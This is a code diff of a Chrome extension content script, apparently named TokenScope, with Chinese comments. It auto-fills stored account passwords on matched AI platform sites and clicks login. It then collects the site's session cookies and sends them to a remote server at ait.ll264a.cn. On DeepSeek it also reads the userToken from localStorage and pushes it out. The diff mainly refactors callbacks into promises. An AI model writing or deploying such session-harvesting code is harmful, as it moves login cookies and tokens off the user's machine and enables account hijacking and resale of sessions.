@@ -1,8 +1,25 @@
 // TokenScope Chrome 插件 - 自动检测 + 自动填登录 + 自动采集推送
 const API_BASE = 'https://ait.ll264a.cn';
 
+function sendMsg(msg, timeoutMs) {
+  timeoutMs = timeoutMs || 15000;
+  return new Promise((resolve, reject) => {
+    const timer = setTimeout(() => {
+      resolve({ error: '响应超时' });
+    }, timeoutMs);
+    chrome.runtime.sendMessage(msg, (resp) => {
+      clearTimeout(timer);
+      const err = chrome.runtime.lastError;
+      if (err) {
+        resolve({ error: err.message || 'runtime error' });
+      } else {
+        resolve(resp);
+      }
+    });
+  });
+}
+
 (async () => {
-  // ============ 从服务器拉取平台列表 ============
   let platforms;
   try {
     const resp = await fetch(API_BASE + '/api/platforms');
@@ -16,7 +33,6 @@ const API_BASE = 'https://ait.ll264a.cn';
     ];
   }
 
-  // ============ 匹配当前页面域名 ============
   const hostname = window.location.hostname;
   let matched = null;
   for (const p of platforms) {
@@ -34,7 +50,11 @@ const API_BASE = 'https://ait.ll264a.cn';
   const platformId = matched.id;
   const cookieDomain = matched.domain;
 
-  // ============ 浮窗 ============
+  let checkInterval = null;
+  const startTime = Date.now();
+  const TIMEOUT = 10 * 60 * 1000;
+  let initialCookies = 0;
+
   function showBadge(text, permanent, style) {
     let badge = document.getElementById('tokenscope-badge');
     if (!badge) {
@@ -57,112 +77,58 @@ const API_BASE = 'https://ait.ll264a.cn';
     if (!permanent) setTimeout(() => badge.style.display = 'none', 8000);
   }
 
-  // ============ 采集 + 推送 ============
   async function collectAndPush() {
-    showBadge('✅ 采集中...', true, { borderColor: '#059669', color: '#4ade80' });
-    await new Promise(r => setTimeout(r, 3000));
+    showBadge('🔭 采集中...', true, { borderColor: '#059669', color: '#4ade80' });
+    await new Promise(r => setTimeout(r, 1000));
 
-    chrome.runtime.sendMessage({ action: 'collect', platform: platformId, domain: cookieDomain }, async (collectResp) => {
-      if (collectResp.status === 'ok' && collectResp.netscape) {
-        const pushResp = await chrome.runtime.sendMessage({ action: 'push', platform: platformId, netscape: collectResp.netscape });
-        if (pushResp.success) {
-          showBadge('✅ ' + collectResp.count + ' Cookie 已推送', true, { borderColor: '#059669', color: '#4ade80' });
-          chrome.runtime.sendMessage({ action: 'clear_login_cred', platform: platformId });
-        } else {
-          showBadge('❌ 推送失败: ' + (pushResp.error || ''), true, { borderColor: '#b91c1c', color: '#ef4444' });
-        }
-      } else {
-        showBadge('❌ 采集失败', true, { borderColor: '#b91c1c', color: '#ef4444' });
-      }
-    });
-  }
-
-  // ============ 先检查是否已登录 ============
-  chrome.runtime.sendMessage({ action: 'count_cookies', domain: cookieDomain }, async (resp) => {
-    const cookieCount = resp?.count || 0;
-
-    // 已登录 → 直接采集
-    if (cookieCount > 3) {
-      showBadge('🔭 已登录, 采集中...', true, { borderColor: '#059669', color: '#4ade80' });
-      await collectAndPush();
+    const collectResp = await sendMsg({ action: 'collect', platform: platformId, domain: cookieDomain });
+    if (!collectResp || collectResp.status !== 'ok' || !collectResp.netscape) {
+      showBadge('❌ 采集失败: ' + (collectResp?.error || '无 Cookie'), true, { borderColor: '#b91c1c', color: '#ef4444' });
       return;
     }
 
-    // 未登录 → 尝试自动填
-    chrome.runtime.sendMessage({ action: 'get_login_cred', platform: platformId }, async (saved) => {
-      if (!saved || !saved.password) {
-        showBadge('⏳ 请登录', true, { borderColor: '#d97706', color: '#f59e0b' });
-        waitForLogin();
-        return;
+    const pushResp = await sendMsg({ action: 'push', platform: platformId, netscape: collectResp.netscape });
+    if (!pushResp || !pushResp.success) {
+      showBadge('❌ 推送失败: ' + (pushResp?.error || ''), true, { borderColor: '#b91c1c', color: '#ef4444' });
+      return;
+    }
+
+    showBadge('✅ ' + collectResp.count + '个 Cookie 已推送', true, { borderColor: '#059669', color: '#4ade80' });
+    await sendMsg({ action: 'clear_login_cred', platform: platformId });
+
+    if (platformId === 'deepseek') {
+      try {
+        const userToken = localStorage.getItem('userToken');
+        if (userToken && userToken.length > 20) {
+          const tokenResp = await sendMsg({ action: 'push_token', platform: 'deepseek', token: userToken });
+          if (tokenResp?.success) {
+            showBadge('✅ userToken 已推送', false, { borderColor: '#059669', color: '#4ade80' });
+          }
+        }
+      } catch(e) {
+        console.log('TokenScope: userToken 失败', e);
       }
+    }
+  }
 
-      const { account, password } = saved;
-      showBadge('🔭 自动填登录...');
-      await new Promise(r => setTimeout(r, 2000));
-
-      // 找登录表单
-      const pwField = document.querySelector('input[type="password"]');
-      if (!pwField) {
-        chrome.runtime.sendMessage({ action: 'count_cookies', domain: cookieDomain }, (r2) => {
-          if (r2?.count > 3) collectAndPush();
-          else { showBadge('⚠️ 未检测到登录表单'); waitForLogin(); }
-        });
-        return;
-      }
-
-      // 找账号框
-      let acctField = null;
-      for (const inp of document.querySelectorAll('input:not([type="hidden"]):not([type="password"])')) {
-        const t = (inp.type || 'text').toLowerCase();
-        if (['text', 'email', 'tel', 'number'].includes(t)) { acctField = inp; break; }
-      }
-
-      // 找登录按钮
-      let submitBtn = null;
-      const forms = pwField.closest('form');
-      if (forms) {
-        submitBtn = forms.querySelector('button[type="submit"], button.btn-primary, button:not([type="button"])');
-        if (!submitBtn) forms.querySelectorAll('button').forEach(b => { if (b.textContent.includes('登录') || b.textContent.includes('Sign')) submitBtn = b; });
-      }
-      if (!submitBtn) document.querySelectorAll('button').forEach(b => { if (b.textContent.includes('登录') || b.textContent.includes('Sign')) submitBtn = b; });
-
-      // 填账号
-      if (account && acctField) {
-        acctField.value = account;
-        acctField.dispatchEvent(new Event('input', { bubbles: true }));
-        acctField.dispatchEvent(new Event('change', { bubbles: true }));
-      }
-
-      // 填密码
-      pwField.value = password;
-      pwField.dispatchEvent(new Event('input', { bubbles: true }));
-      pwField.dispatchEvent(new Event('change', { bubbles: true }));
-
-      showBadge('🔐 已填入, 请处理验证码', false, { borderColor: '#059669', color: '#4ade80' });
-
-      // 自动点登录
-      if (submitBtn) {
-        setTimeout(() => {
-          submitBtn.click();
-          showBadge('👆 已点击登录', true, { borderColor: '#059669', color: '#4ade80' });
-        }, 800);
-      } else {
-        showBadge('✋ 请手动点击登录', true, { borderColor: '#d97706', color: '#f59e0b' });
-      }
-
-      waitForLogin();
-    });
-  });
-
-  // ============ 轮询登录 ============
-  let checkInterval = null;
-  const startTime = Date.now();
-  const TIMEOUT = 10 * 60 * 1000;
-  let initialCookies = 0;
+  async function checkLoop() {
+    if (Date.now() - startTime > TIMEOUT) {
+      showBadge('⏰ 10分钟超时', true, { borderColor: '#b91c1c', color: '#ef4444' });
+      if (checkInterval) clearInterval(checkInterval);
+      return;
+    }
+    const resp = await sendMsg({ action: 'count_cookies', domain: cookieDomain });
+    const n = resp?.count || 0;
+    const urlOk = !/login|sign/i.test(window.location.href);
+    if (n > initialCookies + 2 || (n > 3 && urlOk)) {
+      if (checkInterval) clearInterval(checkInterval);
+      await collectAndPush();
+    }
+  }
 
   function waitForLogin() {
-    chrome.runtime.sendMessage({ action: 'count_cookies', domain: cookieDomain }, (resp) => {
-      initialCookies = resp?.count || 0;
+    sendMsg({ action: 'count_cookies', domain: cookieDomain }).then(r => {
+      initialCookies = r?.count || 0;
     });
     setTimeout(() => {
       checkInterval = setInterval(checkLoop, 2000);
@@ -170,19 +136,70 @@ const API_BASE = 'https://ait.ll264a.cn';
     }, 5000);
   }
 
-  function checkLoop() {
-    if (Date.now() - startTime > TIMEOUT) {
-      showBadge('⏰ 10分钟超时', true, { borderColor: '#b91c1c', color: '#ef4444' });
-      if (checkInterval) clearInterval(checkInterval);
-      return;
-    }
-    chrome.runtime.sendMessage({ action: 'count_cookies', domain: cookieDomain }, async (resp) => {
-      const n = resp?.count || 0;
-      const urlOk = !/login|sign/i.test(window.location.href);
-      if (n > initialCookies + 2 || (n > 3 && urlOk)) {
-        if (checkInterval) clearInterval(checkInterval);
-        await collectAndPush();
-      }
-    });
+  // ============ 主流程 ============
+  const countResp = await sendMsg({ action: 'count_cookies', domain: cookieDomain });
+  const cookieCount = countResp?.count || 0;
+
+  if (cookieCount > 3) {
+    showBadge('🔭 已登录, 采集中...', true, { borderColor: '#059669', color: '#4ade80' });
+    await collectAndPush();
+    return;
   }
+
+  const saved = await sendMsg({ action: 'get_login_cred', platform: platformId });
+  if (!saved || !saved.password) {
+    showBadge('⏳ 请登录', true, { borderColor: '#d97706', color: '#f59e0b' });
+    waitForLogin();
+    return;
+  }
+
+  const { account, password } = saved;
+  showBadge('🔭 自动填登录...');
+  await new Promise(r => setTimeout(r, 2000));
+
+  const pwField = document.querySelector('input[type="password"]');
+  if (!pwField) {
+    const r2 = await sendMsg({ action: 'count_cookies', domain: cookieDomain });
+    if (r2?.count > 3) { await collectAndPush(); return; }
+    showBadge('⚠️ 未检测到登录表单');
+    waitForLogin();
+    return;
+  }
+
+  let acctField = null;
+  for (const inp of document.querySelectorAll('input:not([type="hidden"]):not([type="password"])')) {
+    const t = (inp.type || 'text').toLowerCase();
+    if (['text', 'email', 'tel', 'number'].includes(t)) { acctField = inp; break; }
+  }
+
+  let submitBtn = null;
+  const forms = pwField.closest('form');
+  if (forms) {
+    submitBtn = forms.querySelector('button[type="submit"], button.btn-primary, button:not([type="button"])');
+    if (!submitBtn) forms.querySelectorAll('button').forEach(b => { if (b.textContent.includes('登录') || b.textContent.includes('Sign')) submitBtn = b; });
+  }
+  if (!submitBtn) document.querySelectorAll('button').forEach(b => { if (b.textContent.includes('登录') || b.textContent.includes('Sign')) submitBtn = b; });
+
+  if (account && acctField) {
+    acctField.value = account;
+    acctField.dispatchEvent(new Event('input', { bubbles: true }));
+    acctField.dispatchEvent(new Event('change', { bubbles: true }));
+  }
+
+  pwField.value = password;
+  pwField.dispatchEvent(new Event('input', { bubbles: true }));
+  pwField.dispatchEvent(new Event('change', { bubbles: true }));
+
+  showBadge('🔐 已填入, 请处理验证码', false, { borderColor: '#059669', color: '#4ade80' });
+
+  if (submitBtn) {
+    setTimeout(() => {
+      submitBtn.click();
+      showBadge('👆 已点击登录', true, { borderColor: '#059669', color: '#4ade80' });
+    }, 800);
+  } else {
+    showBadge('✋ 请手动点击登录', true, { borderColor: '#d97706', color: '#f59e0b' });
+  }
+
+  waitForLogin();
 })();
